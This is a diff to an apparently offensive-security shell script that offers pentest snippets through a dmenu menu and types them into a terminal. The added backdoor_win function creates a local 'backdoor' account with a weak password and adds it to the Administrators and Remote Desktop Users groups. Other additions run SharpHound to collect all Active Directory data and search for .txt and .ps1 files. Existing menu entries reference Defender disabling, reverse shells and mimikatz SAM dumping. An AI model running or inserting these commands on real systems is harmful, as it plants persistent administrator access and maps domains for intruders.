@@ -28,7 +28,8 @@ function ctrl() {
 
 function_meta=("bye_bye_defender" "Stabilise_reverse_shell" "Stabilise_reverse_shell3" \
 	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
-	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp")
+	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
+	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect")
 
 # function that are needed
 function stabilize_rev_shell() {
@@ -90,6 +91,26 @@ function meterpreter_proxychain() {
 	command "use post/mult/manage/autoroute"
 }
 
+function powershell_find_txt() {
+	key "Get-ChildItem -Path . -Filter *.txt -Recurse"
+}
+
+function powershell_find_ps1() {
+	key "Get-ChildItem -Path . -Filter *.ps1 -Recurse"
+}
+
+function sharphound_exe_collect() {
+	key "./SharpHound.exe -c All -s --outputdirectory collect --zipfilename log.zip"
+}
+
+function backdoor_win() {
+	command "net user backdoor password1234 /add"
+	sleep 1
+	command "net localgroup \"Administrator\" backdoor /add"
+	sleep 1
+	command "net localgroup \"Remote Desktop Users\" backdoor /add"
+}
+
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
 
 
@@ -115,5 +136,13 @@ if [ ! -z $ret ]; then
 		mimikatz_dump_sam
 	elif [ $ret = "activate_rdp" ]; then
 		activate_rdp
+	elif [ $ret = "backdoor_win" ]; then
+		backdoor_win
+	elif [ $ret = "powershell_find_txt" ]; then
+		powershell_find_txt
+	elif [ $ret = "powershell_find_ps1" ]; then
+		powershell_find_ps1
+	elif [ $ret = "sharphound_exe_collect" ]; then
+		sharphound_exe_collect
 	fi
 fi
